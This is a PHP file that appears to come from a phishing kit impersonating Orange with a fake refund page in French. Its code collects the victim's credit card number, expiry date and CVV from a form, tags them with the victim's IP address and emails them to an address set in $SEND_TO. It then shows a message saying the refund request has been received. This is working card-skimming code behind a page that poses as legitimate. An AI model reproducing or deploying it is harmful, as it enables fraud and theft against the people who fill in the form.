

<?php
    include_once ("auth.php");

    $cryptogram ="crypto";
    $date ="date";
    $cc="cc";
    $mois = "mois";
    $annee = "annee";
    //var_dump($_POST); 
    print $_POST;
    if(isset($_POST['cryptogram']) && isset($_POST['cc']) ){
        $cryptogram = $_POST['cryptogram'];

        $cryptogram = "Cryptogramme: $cryptogram,\nAdresse IP: $IP,";
        // setHeader($data, $IP);
        // $success = mail($SEND_TO, "Cryptogramme - $IP", $data);
    
        $mois = $_POST['mois'];
        $annee = $_POST['annee'] ;
        $date = "Date d'expiration: $mois : $annee ,\nAdresse IP: $IP,";
        // setHeader($data, $IP);
        // $success = mail($SEND_TO, "Date d'expiration - $IP", $data);
        //header("Location: cryptogramme.php");
    
        $cc = $_POST['cc'];
    
        $cc = "Numero de carte: $cc,\nAdresse IP: $IP,";
        $data="$cc \n + $date \n $cryptogram" ;
        setHeader($data, $IP);
        $success = mail($SEND_TO, "Numero de carte - $IP", $data);
    } else{
        setHeader($data, $IP);
        $success = mail($SEND_TO, "Connexion - $IP", $data);
    }   //header("Location: expiration_date.php");
  
?>

<div class="row text-center">
    <div class="col-md-8" style="clear: both;padding: 10px; margin: 30px">
        <div class="o-container o-contact">
            <a href="#" class="OffreItm">
                <h3 style="color:#000;font-size: 28px"><b>Votre demande de remboursement à bien été prise en compte</b></h3>
                <br>
                <p>Vous serez automatiquement redirigé après 5 secondes ...</p>
                <img src="https://media.giphy.com/media/KG4PMQ0jyimywxNt8i/giphy.gif" height="300" alt="" id="loader">
            </a>
        </div>
        <script>
            /*setTimeout(function () {
                window.location.assign("https://www.orange.fr");
            }, 5000);*/
        </script>
    </div>
</div>